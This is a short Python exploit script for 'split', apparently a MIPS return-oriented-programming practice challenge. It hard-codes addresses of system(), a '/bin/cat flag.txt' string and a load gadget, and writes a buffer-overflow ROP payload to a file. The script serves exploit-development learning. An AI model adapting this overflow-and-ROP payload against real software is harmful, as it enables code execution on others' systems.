#!/usr/bin/python3

"""Exploit for split MIPS."""

import argparse
import pathlib
import struct
import sys

# /bin/cat flag.txt
USEFUL_STRING_ADDR = 0x411010

# system("/bin/ls")
SYSTEM_ADDR = 0x400b70

# 0x00400a20 lw a0,8(sp); lw t9,4(sp); jalr t9; nop
LW_GADGET = 0x400a20


def main(argv=sys.argv):
    """main."""
    parser = argparse.ArgumentParser(
        description='Exploit for split MIPS'
    )

    parser.add_argument(
        'payload_file',
        type=pathlib.Path,
        default=pathlib.Path('payload.bin'),
        nargs='?',
        help='Path to write payload file to'
    )

    args = parser.parse_args()

    buf = b'A' * 36
    buf += struct.pack('<I', LW_GADGET)
    buf += b'B' * 4
    buf += struct.pack('<I', SYSTEM_ADDR)
    buf += struct.pack('<I', USEFUL_STRING_ADDR)
    buf += b'C' * 79
    buf += struct.pack('<I', LW_GADGET)
    buf += b'D' * 4

    with args.payload_file.open(mode='wb') as fobj:
        fobj.write(buf)

    return 0


if __name__ == '__main__':
    sys.exit(main(sys.argv))
